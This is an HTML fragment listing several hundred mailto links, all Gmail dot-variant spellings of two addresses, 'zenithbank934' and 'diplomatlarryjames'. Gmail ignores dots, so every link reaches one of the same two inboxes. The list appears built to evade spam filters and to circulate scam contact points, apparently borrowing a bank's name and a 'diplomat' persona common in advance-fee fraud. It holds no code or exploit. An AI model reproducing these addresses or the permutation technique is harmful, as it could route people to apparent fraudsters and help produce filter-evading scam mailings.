<a href=""mailto:ze.n.ithbank9.3.4@gmail.com"">ze.n.ithbank9.3.4@gmail.com</a>
<a href=""mailto:ze.n.it.hba.nk9.3.4@gmail.com"">ze.n.it.hba.nk9.3.4@gmail.com</a>
<a href=""mailto:z.enit.hbank9.34@gmail.com"">z.enit.hbank9.34@gmail.com</a>
<a href=""mailto:zen.ith.ban.k9.34@gmail.com"">zen.ith.ban.k9.34@gmail.com</a>
<a href=""mailto:z.en.ith.b.ank9.34@gmail.com"">z.en.ith.b.ank9.34@gmail.com</a>
<a href=""mailto:zenit.h.b.an.k.93.4@gmail.com"">zenit.h.b.an.k.93.4@gmail.com</a>
<a href=""mailto:zen.it.hb.a.nk.934@gmail.com"">zen.it.hb.a.nk.934@gmail.com</a>
<a href=""mailto:z.enit.hb.a.nk9.34@gmail.com"">z.enit.hb.a.nk9.34@gmail.com</a>
<a href=""mailto:ze.n.i.t.h.b.ank9.34@gmail.com"">ze.n.i.t.h.b.ank9.34@gmail.com</a>
<a href=""mailto:zenit.hb.an.k934@gmail.com"">zenit.hb.an.k934@gmail.com</a>
<a href=""mailto:z.en.i.th.ba.n.k934@gmail.com"">z.en.i.th.ba.n.k934@gmail.com</a>
<a href=""mailto:z.e.nit.h.ban.k.9.34@gmail.com"">z.e.nit.h.ban.k.9.34@gmail.com</a>
<a href=""mailto:zeni.th.b.an.k.93.4@gmail.com"">zeni.th.b.an.k.93.4@gmail.com</a>
<a href=""mailto:z.en.it.h.b.a.n.k.934@gmail.com"">z.en.it.h.b.a.n.k.934@gmail.com</a>
<a href=""mailto:z.enit.hb.an.k.9.3.4@gmail.com"">z.enit.hb.an.k.9.3.4@gmail.com</a>
<a href=""mailto:z.en.ith.b.a.nk934@gmail.com"">z.en.ith.b.a.nk934@gmail.com</a>
<a href=""mailto:ze.n.i.th.ba.n.k934@gmail.com"">ze.n.i.th.ba.n.k934@gmail.com</a>
<a href=""mailto:z.e.n.i.th.ban.k.934@gmail.com"">z.e.n.i.th.ban.k.934@gmail.com</a>
<a href=""mailto:z.eni.t.h.b.an.k934@gmail.com"">z.eni.t.h.b.an.k934@gmail.com</a>
<a href=""mailto:z.e.nith.b.a.n.k.9.34@gmail.com"">z.e.nith.b.a.n.k.9.34@gmail.com</a>
<a href=""mailto:z.e.ni.thbank93.4@gmail.com"">z.e.ni.thbank93.4@gmail.com</a>
<a href=""mailto:zen.i.t.hb.an.k9.3.4@gmail.com"">zen.i.t.hb.an.k9.3.4@gmail.com</a>
<a href=""mailto:z.enit.h.ban.k.934@gmail.com"">z.enit.h.ban.k.934@gmail.com</a>
<a href=""mailto:zeni.th.ba.n.k934@gmail.com"">zeni.th.ba.n.k934@gmail.com</a>
<a href=""mailto:z.e.n.i.t.h.ba.n.k934@gmail.com"">z.e.n.i.t.h.ba.n.k934@gmail.com</a>
<a href=""mailto:z.e.n.it.h.ba.n.k9.34@gmail.com"">z.e.n.it.h.ba.n.k9.34@gmail.com</a>
<a href=""mailto:zenit.hba.n.k.9.34@gmail.com"">zenit.hba.n.k.9.34@gmail.com</a>
<a href=""mailto:ze.nith.bank.9.3.4@gmail.com"">ze.nith.bank.9.3.4@gmail.com</a>
<a href=""mailto:z.eni.t.hba.nk.9.34@gmail.com"">z.eni.t.hba.nk.9.34@gmail.com</a>
<a href=""mailto:z.eni.th.ba.n.k.93.4@gmail.com"">z.eni.th.ba.n.k.93.4@gmail.com</a>
<a href=""mailto:z.en.ithba.n.k.9.3.4@gmail.com"">z.en.ithba.n.k.9.3.4@gmail.com</a>
<a href=""mailto:z.e.n.i.thb.a.nk.9.34@gmail.com"">z.e.n.i.thb.a.nk.9.34@gmail.com</a>
<a href=""mailto:z.en.i.thb.a.n.k9.3.4@gmail.com"">z.en.i.thb.a.n.k9.3.4@gmail.com</a>
<a href=""mailto:z.en.i.t.h.ban.k.934@gmail.com"">z.en.i.t.h.ban.k.934@gmail.com</a>
<a href=""mailto:z.e.n.it.hba.n.k934@gmail.com"">z.e.n.it.hba.n.k934@gmail.com</a>
<a href=""mailto:z.e.ni.t.h.b.a.n.k9.3.4@gmail.com"">z.e.ni.t.h.b.a.n.k9.3.4@gmail.com</a>
<a href=""mailto:z.enit.h.bank934@gmail.com"">z.enit.h.bank934@gmail.com</a>
<a href=""mailto:z.e.n.it.hb.an.k.93.4@gmail.com"">z.e.n.it.hb.an.k.93.4@gmail.com</a>
<a href=""mailto:ze.nithb.a.n.k93.4@gmail.com"">ze.nithb.a.n.k93.4@gmail.com</a>
<a href=""mailto:z.en.i.th.ba.nk9.34@gmail.com"">z.en.i.th.ba.nk9.34@gmail.com</a>
<a href=""mailto:z.en.i.t.hb.a.nk9.3.4@gmail.com"">z.en.i.t.hb.a.nk9.3.4@gmail.com</a>
<a href=""mailto:z.e.n.i.thb.an.k9.3.4@gmail.com"">z.e.n.i.thb.an.k9.3.4@gmail.com</a>
<a href=""mailto:z.e.n.i.t.h.b.a.nk9.3.4@gmail.com"">z.e.n.i.t.h.b.a.nk9.3.4@gmail.com</a>
<a href=""mailto:zen.ith.b.a.n.k9.34@gmail.com"">zen.ith.b.a.n.k9.34@gmail.com</a>
<a href=""mailto:z.eni.th.b.ank9.34@gmail.com"">z.eni.th.b.ank9.34@gmail.com</a>
<a href=""mailto:z.e.nit.h.b.ank.9.34@gmail.com"">z.e.nit.h.b.ank.9.34@gmail.com</a>
<a href=""mailto:z.e.n.i.th.b.a.nk934@gmail.com"">z.e.n.i.th.b.a.nk934@gmail.com</a>
<a href=""mailto:z.e.ni.thb.a.n.k.93.4@gmail.com"">z.e.ni.thb.a.n.k.93.4@gmail.com</a>
<a href=""mailto:z.en.i.t.h.b.ank934@gmail.com"">z.en.i.t.h.b.ank934@gmail.com</a>
<a href=""mailto:zen.ith.ba.nk93.4@gmail.com"">zen.ith.ba.nk93.4@gmail.com</a>
<a href=""mailto:zen.ith.b.ank.93.4@gmail.com"">zen.ith.b.ank.93.4@gmail.com</a>
<a href=""mailto:z.en.it.h.ban.k.93.4@gmail.com"">z.en.it.h.ban.k.93.4@gmail.com</a>
<a href=""mailto:ze.ni.th.b.a.nk93.4@gmail.com"">ze.ni.th.b.a.nk93.4@gmail.com</a>
<a href=""mailto:ze.n.ith.b.an.k.9.34@gmail.com"">ze.n.ith.b.an.k.9.34@gmail.com</a>
<a href=""mailto:zen.ith.ba.nk.9.3.4@gmail.com"">zen.ith.ba.nk.9.3.4@gmail.com</a>
<a href=""mailto:z.e.ni.t.hba.n.k93.4@gmail.com"">z.e.ni.t.hba.n.k93.4@gmail.com</a>
<a href=""mailto:z.e.n.i.th.b.an.k.9.34@gmail.com"">z.e.n.i.th.b.an.k.9.34@gmail.com</a>
<a href=""mailto:ze.n.ith.ba.n.k934@gmail.com"">ze.n.ith.ba.n.k934@gmail.com</a>
<a href=""mailto:zenithba.n.k.9.3.4@gmail.com"">zenithba.n.k.9.3.4@gmail.com</a>
<a href=""mailto:z.eni.t.h.ba.n.k93.4@gmail.com"">z.eni.t.h.ba.n.k93.4@gmail.com</a>
<a href=""mailto:z.e.ni.th.ba.n.k93.4@gmail.com"">z.e.ni.th.ba.n.k93.4@gmail.com</a>
<a href=""mailto:zen.i.t.hba.n.k.9.3.4@gmail.com"">zen.i.t.hba.n.k.9.3.4@gmail.com</a>
<a href=""mailto:ze.nit.hb.a.nk.9.3.4@gmail.com"">ze.nit.hb.a.nk.9.3.4@gmail.com</a>
<a href=""mailto:z.eni.t.hb.ank934@gmail.com"">z.eni.t.hb.ank934@gmail.com</a>
<a href=""mailto:ze.n.ithb.a.nk.93.4@gmail.com"">ze.n.ithb.a.nk.93.4@gmail.com</a>
<a href=""mailto:z.e.nit.h.ba.n.k.93.4@gmail.com"">z.e.nit.h.ba.n.k.93.4@gmail.com</a>
<a href=""mailto:z.e.n.i.th.b.ank.93.4@gmail.com"">z.e.n.i.th.b.ank.93.4@gmail.com</a>
<a href=""mailto:z.en.i.th.b.an.k.93.4@gmail.com"">z.en.i.th.b.an.k.93.4@gmail.com</a>
<a href=""mailto:z.en.i.th.b.a.nk9.34@gmail.com"">z.en.i.th.b.a.nk9.34@gmail.com</a>
<a href=""mailto:z.e.nith.b.ank934@gmail.com"">z.e.nith.b.ank934@gmail.com</a>
<a href=""mailto:zen.i.t.h.ba.n.k9.34@gmail.com"">zen.i.t.h.ba.n.k9.34@gmail.com</a>
<a href=""mailto:z.e.nit.hban.k.9.3.4@gmail.com"">z.e.nit.hban.k.9.3.4@gmail.com</a>
<a href=""mailto:zeni.t.hba.n.k9.34@gmail.com"">zeni.t.hba.n.k9.34@gmail.com</a>
<a href=""mailto:ze.nit.h.ban.k.9.34@gmail.com"">ze.nit.h.ban.k.9.34@gmail.com</a>
<a href=""mailto:z.en.it.h.bank.934@gmail.com"">z.en.it.h.bank.934@gmail.com</a>
<a href=""mailto:zeni.thb.an.k.93.4@gmail.com"">zeni.thb.an.k.93.4@gmail.com</a>
<a href=""mailto:z.en.ith.ba.n.k.934@gmail.com"">z.en.ith.ba.n.k.934@gmail.com</a>
<a href=""mailto:z.e.ni.t.hbank.93.4@gmail.com"">z.e.ni.t.hbank.93.4@gmail.com</a>
<a href=""mailto:zen.i.th.b.a.nk934@gmail.com"">zen.i.th.b.a.nk934@gmail.com</a>
<a href=""mailto:zenit.hb.an.k.9.34@gmail.com"">zenit.hb.an.k.9.34@gmail.com</a>
<a href=""mailto:zen.ithb.ank9.3.4@gmail.com"">zen.ithb.ank9.3.4@gmail.com</a>
<a href=""mailto:ze.nithbank.93.4@gmail.com"">ze.nithbank.93.4@gmail.com</a>
<a href=""mailto:zenit.hb.a.n.k93.4@gmail.com"">zenit.hb.a.n.k93.4@gmail.com</a>
<a href=""mailto:ze.nith.b.a.n.k.9.3.4@gmail.com"">ze.nith.b.a.n.k.9.3.4@gmail.com</a>
<a href=""mailto:z.enit.h.b.a.n.k934@gmail.com"">z.enit.h.b.a.n.k934@gmail.com</a>
<a href=""mailto:ze.ni.t.h.b.ank.9.34@gmail.com"">ze.ni.t.h.b.ank.9.34@gmail.com</a>
<a href=""mailto:zeni.t.h.b.ank9.3.4@gmail.com"">zeni.t.h.b.ank9.3.4@gmail.com</a>
<a href=""mailto:z.e.nithb.a.n.k93.4@gmail.com"">z.e.nithb.a.n.k93.4@gmail.com</a>
<a href=""mailto:z.e.ni.thb.a.n.k.9.34@gmail.com"">z.e.ni.thb.a.n.k.9.34@gmail.com</a>
<a href=""mailto:diplomatlarryjames@gmail.com"">diplomatlarryjames@gmail.com</a>
<a href=""mailto:d.ip.lomat.la.r.ryj.a.mes@gmail.com"">d.ip.lomat.la.r.ryj.a.mes@gmail.com</a>
<a href=""mailto:dipl.o.m.at.larr.yja.m.e.s@gmail.com"">dipl.o.m.at.larr.yja.m.e.s@gmail.com</a>
<a href=""mailto:d.ip.lom.at.l.ar.ryjam.es@gmail.com"">d.ip.lom.at.l.ar.ryjam.es@gmail.com</a>
<a href=""mailto:d.i.pl.om.a.t.l.arr.y.ja.m.es@gmail.com"">d.i.pl.om.a.t.l.arr.y.ja.m.es@gmail.com</a>
<a href=""mailto:d.ip.l.o.m.atlarr.y.james@gmail.com"">d.ip.l.o.m.atlarr.y.james@gmail.com</a>
<a href=""mailto:di.p.lom.at.lar.ry.jam.e.s@gmail.com"">di.p.lom.at.lar.ry.jam.e.s@gmail.com</a>
<a href=""mailto:dipl.om.a.tl.arr.y.j.a.mes@gmail.com"">dipl.om.a.tl.arr.y.j.a.mes@gmail.com</a>
<a href=""mailto:d.i.pl.o.matl.arry.j.a.me.s@gmail.com"">d.i.pl.o.matl.arry.j.a.me.s@gmail.com</a>
<a href=""mailto:di.plo.matl.arr.yja.m.es@gmail.com"">di.plo.matl.arr.yja.m.es@gmail.com</a>
<a href=""mailto:di.p.lo.ma.t.lar.r.yj.am.e.s@gmail.com"">di.p.lo.ma.t.lar.r.yj.am.e.s@gmail.com</a>
<a href=""mailto:dipl.o.ma.t.l.arr.y.j.a.me.s@gmail.com"">dipl.o.ma.t.l.arr.y.j.a.me.s@gmail.com</a>
<a href=""mailto:d.ipl.om.a.t.l.a.r.ry.james@gmail.com"">d.ipl.om.a.t.l.a.r.ry.james@gmail.com</a>
<a href=""mailto:di.p.lomat.la.rry.j.am.es@gmail.com"">di.p.lomat.la.rry.j.am.es@gmail.com</a>
<a href=""mailto:d.iplom.at.larry.j.am.es@gmail.com"">d.iplom.at.larry.j.am.es@gmail.com</a>
<a href=""mailto:diplo.ma.tl.a.rr.y.j.a.me.s@gmail.com"">diplo.ma.tl.a.rr.y.j.a.me.s@gmail.com</a>
<a href=""mailto:d.i.plom.a.t.l.a.rry.james@gmail.com"">d.i.plom.a.t.l.a.rry.james@gmail.com</a>
<a href=""mailto:d.i.p.l.o.ma.tl.ar.ryj.a.me.s@gmail.com"">d.i.p.l.o.ma.tl.ar.ryj.a.me.s@gmail.com</a>
<a href=""mailto:di.pl.omatl.a.r.ryjam.e.s@gmail.com"">di.pl.omatl.a.r.ryjam.e.s@gmail.com</a>
<a href=""mailto:d.i.plo.m.atl.a.rr.y.jame.s@gmail.com"">d.i.plo.m.atl.a.rr.y.jame.s@gmail.com</a>
<a href=""mailto:dip.lomatla.rry.j.a.m.e.s@gmail.com"">dip.lomatla.rry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:d.i.p.l.omatlar.ry.james@gmail.com"">d.i.p.l.omatlar.ry.james@gmail.com</a>
<a href=""mailto:dip.l.o.matl.arr.y.j.ame.s@gmail.com"">dip.l.o.matl.arr.y.j.ame.s@gmail.com</a>
<a href=""mailto:d.iplom.a.tl.ar.r.y.j.a.mes@gmail.com"">d.iplom.a.tl.ar.r.y.j.a.mes@gmail.com</a>
<a href=""mailto:d.i.pl.o.ma.tl.a.rry.ja.mes@gmail.com"">d.i.pl.o.ma.tl.a.rry.ja.mes@gmail.com</a>
<a href=""mailto:dip.l.om.a.t.la.rr.y.j.a.m.es@gmail.com"">dip.l.om.a.t.la.rr.y.j.a.m.es@gmail.com</a>
<a href=""mailto:di.p.l.om.a.t.la.rry.j.a.mes@gmail.com"">di.p.l.om.a.t.la.rry.j.a.mes@gmail.com</a>
<a href=""mailto:d.i.plomat.la.rry.j.a.m.e.s@gmail.com"">d.i.plomat.la.rry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:d.i.pl.o.matl.ar.ry.ja.mes@gmail.com"">d.i.pl.o.matl.ar.ry.ja.mes@gmail.com</a>
<a href=""mailto:dip.lo.m.at.l.a.r.r.yjames@gmail.com"">dip.lo.m.at.l.a.r.r.yjames@gmail.com</a>
<a href=""mailto:dip.lo.ma.tla.rry.j.ame.s@gmail.com"">dip.lo.ma.tla.rry.j.ame.s@gmail.com</a>
<a href=""mailto:d.i.p.lomatl.a.rr.yjame.s@gmail.com"">d.i.p.lomatl.a.rr.yjame.s@gmail.com</a>
<a href=""mailto:d.i.p.lo.m.a.tlar.r.y.j.am.e.s@gmail.com"">d.i.p.lo.m.a.tlar.r.y.j.am.e.s@gmail.com</a>
<a href=""mailto:dip.lo.m.a.tl.arr.y.ja.mes@gmail.com"">dip.lo.m.a.tl.arr.y.ja.mes@gmail.com</a>
<a href=""mailto:dipl.o.m.a.tlar.r.y.jam.es@gmail.com"">dipl.o.m.a.tlar.r.y.jam.es@gmail.com</a>
<a href=""mailto:d.ipl.om.atlarry.j.a.m.e.s@gmail.com"">d.ipl.om.atlarry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:dip.l.om.atla.r.r.yj.a.m.es@gmail.com"">dip.l.om.atla.r.r.yj.a.m.es@gmail.com</a>
<a href=""mailto:d.i.pl.om.a.tlarry.j.a.m.e.s@gmail.com"">d.i.pl.om.a.tlarry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:dip.l.oma.t.la.rryja.mes@gmail.com"">dip.l.oma.t.la.rryja.mes@gmail.com</a>
<a href=""mailto:di.p.l.o.m.at.la.r.r.yjam.e.s@gmail.com"">di.p.l.o.m.at.la.r.r.yjam.e.s@gmail.com</a>
<a href=""mailto:d.i.plo.m.at.lar.r.y.j.a.mes@gmail.com"">d.i.plo.m.at.lar.r.y.j.a.mes@gmail.com</a>
<a href=""mailto:d.i.p.lo.m.atl.arryja.m.e.s@gmail.com"">d.i.p.lo.m.atl.arryja.m.e.s@gmail.com</a>
<a href=""mailto:d.i.pl.o.matlarryja.m.e.s@gmail.com"">d.i.pl.o.matlarryja.m.e.s@gmail.com</a>
<a href=""mailto:di.pl.om.at.l.a.r.r.yj.a.me.s@gmail.com"">di.pl.om.at.l.a.r.r.yj.a.me.s@gmail.com</a>
<a href=""mailto:dipl.o.ma.tl.arr.yjames@gmail.com"">dipl.o.ma.tl.arr.yjames@gmail.com</a>
<a href=""mailto:diplo.m.atl.arr.y.j.ames@gmail.com"">diplo.m.atl.arr.y.j.ames@gmail.com</a>
<a href=""mailto:di.p.lom.a.t.l.a.rryjames@gmail.com"">di.p.lom.a.t.l.a.rryjames@gmail.com</a>
<a href=""mailto:dip.lomatla.r.ry.james@gmail.com"">dip.lomatla.r.ry.james@gmail.com</a>
<a href=""mailto:d.ip.l.o.mat.l.arr.y.j.ame.s@gmail.com"">d.ip.l.o.mat.l.arr.y.j.ame.s@gmail.com</a>
<a href=""mailto:dip.lomatlarry.ja.m.e.s@gmail.com"">dip.lomatlarry.ja.m.e.s@gmail.com</a>
<a href=""mailto:di.p.l.om.a.t.l.a.rryj.am.es@gmail.com"">di.p.l.om.a.t.l.a.rryj.am.es@gmail.com</a>
<a href=""mailto:d.i.p.l.om.a.t.l.a.rr.y.jam.e.s@gmail.com"">d.i.p.l.om.a.t.l.a.rr.y.jam.e.s@gmail.com</a>
<a href=""mailto:d.i.p.l.o.m.a.tla.r.r.yj.am.es@gmail.com"">d.i.p.l.o.m.a.tla.r.r.yj.am.es@gmail.com</a>
<a href=""mailto:d.ip.lo.m.at.l.a.r.ry.james@gmail.com"">d.ip.lo.m.at.l.a.r.ry.james@gmail.com</a>
<a href=""mailto:di.plomatlar.ry.j.a.m.e.s@gmail.com"">di.plomatlar.ry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:di.p.l.om.at.l.a.r.r.yja.m.es@gmail.com"">di.p.l.om.at.l.a.r.r.yja.m.es@gmail.com</a>
<a href=""mailto:d.i.p.l.o.matlar.r.yj.a.mes@gmail.com"">d.i.p.l.o.matlar.r.yj.a.mes@gmail.com</a>
<a href=""mailto:dip.loma.t.l.arryj.a.me.s@gmail.com"">dip.loma.t.l.arryj.a.me.s@gmail.com</a>
<a href=""mailto:d.i.p.l.omat.larryjam.e.s@gmail.com"">d.i.p.l.omat.larryjam.e.s@gmail.com</a>
<a href=""mailto:d.i.p.lo.mat.la.r.ry.j.am.e.s@gmail.com"">d.i.p.lo.mat.la.r.ry.j.am.e.s@gmail.com</a>
<a href=""mailto:dip.lo.m.atl.arryja.m.e.s@gmail.com"">dip.lo.m.atl.arryja.m.e.s@gmail.com</a>
<a href=""mailto:d.i.p.l.omat.l.arr.yja.m.e.s@gmail.com"">d.i.p.l.omat.l.arr.yja.m.e.s@gmail.com</a>
<a href=""mailto:di.plo.matla.rry.j.ame.s@gmail.com"">di.plo.matla.rry.j.ame.s@gmail.com</a>
<a href=""mailto:diplo.ma.tl.a.r.r.y.james@gmail.com"">diplo.ma.tl.a.r.r.y.james@gmail.com</a>
<a href=""mailto:d.i.p.lo.m.a.tl.ar.ry.ja.m.es@gmail.com"">d.i.p.lo.m.a.tl.ar.ry.ja.m.es@gmail.com</a>
<a href=""mailto:d.i.pl.o.ma.tl.a.r.ryjam.es@gmail.com"">d.i.pl.o.ma.tl.a.r.ryjam.es@gmail.com</a>
<a href=""mailto:dip.loma.tl.arr.yjam.e.s@gmail.com"">dip.loma.tl.arr.yjam.e.s@gmail.com</a>
<a href=""mailto:d.i.p.l.oma.t.l.ar.ry.j.am.es@gmail.com"">d.i.p.l.oma.t.l.ar.ry.j.am.es@gmail.com</a>
<a href=""mailto:dip.l.o.matlarr.y.ja.m.e.s@gmail.com"">dip.l.o.matlarr.y.ja.m.e.s@gmail.com</a>
<a href=""mailto:di.plomatl.a.rry.j.a.m.e.s@gmail.com"">di.plomatl.a.rry.j.a.m.e.s@gmail.com</a>
<a href=""mailto:dip.loma.tl.ar.ry.j.ames@gmail.com"">dip.loma.tl.ar.ry.j.ames@gmail.com</a>
<a href=""mailto:d.i.plomatlarry.jam.e.s@gmail.com"">d.i.plomatlarry.jam.e.s@gmail.com</a>
<a href=""mailto:d.ipl.o.ma.tl.arr.yj.am.e.s@gmail.com"">d.ipl.o.ma.tl.arr.yj.am.e.s@gmail.com</a>
<a href=""mailto:di.p.lo.ma.tl.a.r.r.yja.me.s@gmail.com"">di.p.lo.ma.tl.a.r.r.yja.me.s@gmail.com</a>
<a href=""mailto:d.i.p.l.om.atla.rry.jam.es@gmail.com"">d.i.p.l.om.atla.rry.jam.es@gmail.com</a>
<a href=""mailto:d.iplom.at.l.arr.y.ja.mes@gmail.com"">d.iplom.at.l.arr.y.ja.mes@gmail.com</a>
<a href=""mailto:dip.lo.m.a.tl.arryj.a.me.s@gmail.com"">dip.lo.m.a.tl.arryj.a.me.s@gmail.com</a>
<a href=""mailto:d.i.p.l.o.m.at.larr.yja.me.s@gmail.com"">d.i.p.l.o.m.at.larr.yja.me.s@gmail.com</a>
<a href=""mailto:dip.l.omat.larr.yj.am.e.s@gmail.com"">dip.l.omat.larr.yj.am.e.s@gmail.com</a>
<a href=""mailto:di.p.l.o.m.atla.r.ryjam.es@gmail.com"">di.p.l.o.m.atla.r.ryjam.es@gmail.com</a>
<a href=""mailto:d.i.p.l.om.a.tlarr.y.jam.es@gmail.com"">d.i.p.l.om.a.tlarr.y.jam.es@gmail.com</a>
<a href=""mailto:diplo.mat.l.a.rr.y.j.a.me.s@gmail.com"">diplo.mat.l.a.rr.y.j.a.me.s@gmail.com</a>
<a href=""mailto:d.iplomat.l.a.rr.y.j.a.mes@gmail.com"">d.iplomat.l.a.rr.y.j.a.mes@gmail.com</a>
<a href=""mailto:d.i.p.l.o.matla.rryj.am.es@gmail.com"">d.i.p.l.o.matla.rryj.am.es@gmail.com</a>
<a href=""mailto:dip.l.omat.la.r.r.y.jam.es@gmail.com"">dip.l.omat.la.r.r.y.jam.es@gmail.com</a>
<a href=""mailto:dip.l.o.mat.la.rr.yjame.s@gmail.com"">dip.l.o.mat.la.rr.yjame.s@gmail.com</a>
<a href=""mailto:d.i.plom.at.l.a.rr.y.jam.es@gmail.com"">d.i.plom.at.l.a.rr.y.jam.es@gmail.com</a>
<a href=""mailto:diplomatlar.ryj.a.m.e.s@gmail.com"">diplomatlar.ryj.a.m.e.s@gmail.com</a>
<a href=""mailto:di.pl.om.atl.a.r.ry.j.am.es@gmail.com"">di.pl.om.atl.a.r.ry.j.am.es@gmail.com</a>
<a href=""mailto:d.i.p.lo.m.atla.r.r.yja.mes@gmail.com"">d.i.p.lo.m.atla.r.r.yja.mes@gmail.com</a>
<a href=""mailto:di.p.l.omatla.r.r.yj.a.m.es@gmail.com"">di.p.l.omatla.r.r.yj.a.m.es@gmail.com</a>
<a href=""mailto:dip.l.om.at.la.rryjam.e.s@gmail.com"">dip.l.om.at.la.rryjam.e.s@gmail.com</a>
<a href=""mailto:d.i.p.l.o.m.atl.a.r.r.y.j.am.es@gmail.com"">d.i.p.l.o.m.atl.a.r.r.y.j.am.es@gmail.com</a>
<a href=""mailto:diplo.m.a.tl.ar.r.y.ja.m.es@gmail.com"">diplo.m.a.tl.ar.r.y.ja.m.es@gmail.com</a>
<a href=""mailto:dip.l.o.m.a.tlar.r.yj.a.me.s@gmail.com"">dip.l.o.m.a.tlar.r.yj.a.me.s@gmail.com</a>
<a href=""mailto:di.plomat.l.a.rryjame.s@gmail.com"">di.plomat.l.a.rryjame.s@gmail.com</a>
<a href=""mailto:diplo.m.a.tl.ar.ryja.mes@gmail.com"">diplo.m.a.tl.ar.ryja.mes@gmail.com</a>
<a href=""mailto:d.ipl.om.a.t.l.arryj.ames@gmail.com"">d.ipl.om.a.t.l.arryj.ames@gmail.com</a>
<a href=""mailto:di.plo.m.a.tla.r.r.y.jame.s@gmail.com"">di.plo.m.a.tla.r.r.y.jame.s@gmail.com</a>
<a href=""mailto:dipl.omat.la.rr.y.j.ames@gmail.com"">dipl.omat.la.rr.y.j.ames@gmail.com</a>
<a href=""mailto:d.i.plo.m.at.lar.ry.j.ames@gmail.com"">d.i.plo.m.at.lar.ry.j.ames@gmail.com</a>
<a href=""mailto:d.ip.lom.at.la.r.ryj.a.mes@gmail.com"">d.ip.lom.at.la.r.ryj.a.mes@gmail.com</a>
<a href=""mailto:dipl.o.matl.a.r.ryj.am.es@gmail.com"">dipl.o.matl.a.r.ryj.am.es@gmail.com</a>
<a href=""mailto:di.pl.om.a.tl.ar.r.yj.am.es@gmail.com"">di.pl.om.a.tl.ar.r.yj.am.es@gmail.com</a>
<a href=""mailto:di.p.l.omat.la.r.ryj.a.m.es@gmail.com"">di.p.l.omat.la.r.ryj.a.m.es@gmail.com</a>
<a href=""mailto:di.p.lom.a.tl.ar.r.yjames@gmail.com"">di.p.lom.a.tl.ar.r.yjames@gmail.com</a>
<a href=""mailto:d.ipl.o.matla.r.r.yj.ame.s@gmail.com"">d.ipl.o.matla.r.r.yj.ame.s@gmail.com</a>
<a href=""mailto:dip.l.oma.t.lar.r.y.james@gmail.com"">dip.l.oma.t.lar.r.y.james@gmail.com</a>
<a href=""mailto:diplom.at.larr.yjam.es@gmail.com"">diplom.at.larr.yjam.es@gmail.com</a>
<a href=""mailto:dip.l.om.atlarryja.m.es@gmail.com"">dip.l.om.atlarryja.m.es@gmail.com</a>
<a href=""mailto:diplo.mat.la.rryja.m.e.s@gmail.com"">diplo.mat.la.rryja.m.e.s@gmail.com</a>
<a href=""mailto:di.p.l.omat.la.r.r.yj.ame.s@gmail.com"">di.p.l.omat.la.r.r.yj.ame.s@gmail.com</a>
<a href=""mailto:dipl.om.atl.ar.ryja.m.e.s@gmail.com"">dipl.om.atl.ar.ryja.m.e.s@gmail.com</a>
<a href=""mailto:di.pl.o.m.atl.ar.ry.j.a.me.s@gmail.com"">di.pl.o.m.atl.ar.ry.j.a.me.s@gmail.com</a>
<a href=""mailto:d.i.p.lomatla.rr.y.ja.me.s@gmail.com"">d.i.p.lomatla.rr.y.ja.me.s@gmail.com</a>
<a href=""mailto:d.iplom.atl.ar.r.yja.m.e.s@gmail.com"">d.iplom.atl.ar.r.yja.m.e.s@gmail.com</a>
<a href=""mailto:d.ip.l.o.m.a.tla.r.r.y.jam.es@gmail.com"">d.ip.l.o.m.a.tla.r.r.y.jam.es@gmail.com</a>
<a href=""mailto:d.i.p.loma.t.la.r.r.y.james@gmail.com"">d.i.p.loma.t.la.r.r.y.james@gmail.com</a>
<a href=""mailto:diploma.t.lar.r.yja.mes@gmail.com"">diploma.t.lar.r.yja.mes@gmail.com</a>
<a href=""mailto:dip.l.om.at.l.arry.james@gmail.com"">dip.l.om.at.l.arry.james@gmail.com</a>
<a href=""mailto:d.i.pl.om.a.t.l.a.r.r.yja.m.e.s@gmail.com"">d.i.pl.om.a.t.l.a.r.r.yja.m.e.s@gmail.com</a>
<a href=""mailto:d.i.p.lo.ma.t.l.arry.ja.me.s@gmail.com"">d.i.p.lo.ma.t.l.arry.ja.me.s@gmail.com</a>
<a href=""mailto:d.ip.lo.ma.t.l.ar.r.yja.mes@gmail.com"">d.ip.lo.ma.t.l.ar.r.yja.mes@gmail.com</a>
<a href=""mailto:di.p.lo.m.at.larr.y.james@gmail.com"">di.p.lo.m.at.larr.y.james@gmail.com</a>
<a href=""mailto:d.ipl.omat.larry.jam.e.s@gmail.com"">d.ipl.omat.larry.jam.e.s@gmail.com</a>
<a href=""mailto:di.p.lo.m.atl.a.r.ry.j.a.m.es@gmail.com"">di.p.lo.m.atl.a.r.ry.j.a.m.es@gmail.com</a>
<a href=""mailto:d.i.p.l.om.atl.a.rr.yj.ame.s@gmail.com"">d.i.p.l.om.atl.a.rr.yj.ame.s@gmail.com</a>
<a href=""mailto:di.pl.omatl.ar.r.y.ja.m.e.s@gmail.com"">di.pl.omatl.ar.r.y.ja.m.e.s@gmail.com</a>
<a href=""mailto:d.i.p.l.omatl.a.rryjame.s@gmail.com"">d.i.p.l.omatl.a.rryjame.s@gmail.com</a>
<a href=""mailto:d.ip.lo.matlarryjam.e.s@gmail.com"">d.ip.lo.matlarryjam.e.s@gmail.com</a>
<a href=""mailto:di.plom.a.tla.r.r.yjame.s@gmail.com"">di.plom.a.tla.r.r.yjame.s@gmail.com</a>
<a href=""mailto:dip.l.o.mat.l.arryjames@gmail.com"">dip.l.o.mat.l.arryjames@gmail.com</a>
<a href=""mailto:d.ipl.omat.l.arr.y.j.am.e.s@gmail.com"">d.ipl.omat.l.arr.y.j.am.e.s@gmail.com</a>
<a href=""mailto:d.i.p.l.o.mat.l.ar.ryja.m.es@gmail.com"">d.i.p.l.o.mat.l.ar.ryja.m.es@gmail.com</a>
<a href=""mailto:di.p.lo.ma.t.l.a.r.ryj.a.m.e.s@gmail.com"">di.p.lo.ma.t.l.a.r.ryj.a.m.e.s@gmail.com</a>
<a href=""mailto:dip.lom.at.l.arryj.a.me.s@gmail.com"">dip.lom.at.l.arryj.a.me.s@gmail.com</a>
<a href=""mailto:di.p.l.o.m.a.tlar.r.y.ja.me.s@gmail.com"">di.p.l.o.m.a.tlar.r.y.ja.me.s@gmail.com</a>
<a href=""mailto:di.ploma.tl.a.r.ryj.ames@gmail.com"">di.ploma.tl.a.r.ryj.ames@gmail.com</a>
<a href=""mailto:d.ip.l.om.at.lar.ryjame.s@gmail.com"">d.ip.l.om.at.lar.ryjame.s@gmail.com</a>
